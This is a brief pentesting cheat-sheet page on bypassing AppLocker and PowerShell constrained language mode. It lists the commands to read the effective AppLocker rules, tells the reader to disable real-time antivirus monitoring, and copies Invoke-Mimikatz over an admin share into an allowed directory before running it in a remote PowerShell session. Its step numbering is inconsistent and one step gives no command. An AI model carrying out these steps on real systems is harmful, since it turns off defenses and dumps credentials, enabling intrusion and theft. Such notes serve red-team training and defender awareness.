---
description: AppLocker
---

# AppLocker

> Powershell running in constrained language mode means we can not run some cmdlets which are not considered to be safe. Only built-in cmdlets, nothing else.

### List language

```bash
$ExecutionContext.SessionState.LanguageMode
```

### AppLocker policy Bypass

1. Grab the AppLocker policy:

```bash
#Get a list of rules, there we can see dirs where script execution is allowed.
#Output: All scripts located in the XXX are allowed. If there is noone, see also microsoft signed binaries (can be useful).
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
```

1. Once we have the exception directory, disable realtime monitoring (since we are going to touch disk):
2. Exit the shell and transfer the file to the remote machine:

```bash
Copy-Item .\Invoke-Mimikatz.ps1 \\server.local\c$\'Program Files'
#Note: Remember to all the function in the end of the script, otherwise we will get an error like "it was defined in a differente language mode".
```

1. Run the script on the remote machine:

```bash
Enter-PSSession -ComputerName $COMPUTER_NAME
.\Invoke-Mimikatz
```
